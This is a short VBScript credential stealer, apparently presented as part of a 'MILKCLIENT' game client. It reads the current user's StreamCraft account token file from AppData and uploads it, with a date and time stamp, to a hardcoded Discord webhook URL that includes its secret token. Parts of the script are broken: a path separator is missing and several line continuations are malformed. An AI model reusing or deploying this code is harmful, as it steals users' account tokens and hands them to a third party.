Dim objHTTP, strURL, strFile, strBoundary, strMessage

strURL = "https://discord.com/api/webhooks/1189551372673241128/f_NpDonu4eZ0bLM34Yp78lja6IMp2KpQuy1kRzcYTvCn92K051JX1QcxRSfLY8ULelwi"

Set objNetwork = CreateObject("WScript.Network")
strUser = objNetwork.UserName
strFile = "C:\Users" & strUser & "\AppData\Roaming\StreamCraft\store\token.json"

' Формируем сообщение
strMessage = "MILKCLIENT | LEAK SECURITY" & vbCrLf & 
    "Account token in file!" & vbCrLf & 
    "" & vbCrLf & 
    "Data: " & Date & vbCrLf & 
    "Time: " & Time & vbCrLf &
    "" & vbCrLf & 
    "Account token in file!" & vbCrLf & _
    "MILK CLIENT | LEAK SECURITY"

Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objHTTP.Open "POST", strURL, False

strBoundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
objHTTP.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & strBoundary

strRequest = vbCrLf & "--" & strBoundary & vbCrLf
strRequest = strRequest & "Content-Disposition: form-data; name=""file""; filename=""" & strFile & """" & vbCrLf
strRequest = strRequest & "Content-Type: application/octet-stream" & vbCrLf & vbCrLf

Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1
objStream.Open
objStream.LoadFromFile strFile
objStream.Position = 0
objStream.Type = 2
objStream.Charset = "windows-1251"
strRequest = strRequest & objStream.ReadText() & vbCrLf

strRequest = strRequest & "--" & strBoundary & vbCrLf
strRequest = strRequest & "Content-Disposition: form-data; name=""content""" & vbCrLf & vbCrLf
strRequest = strRequest & strMessage & vbCrLf

strRequest = strRequest & "--" & strBoundary & "--" & vbCrLf

objHTTP.Send strRequest

Set objStream = Nothing
Set objHTTP = Nothing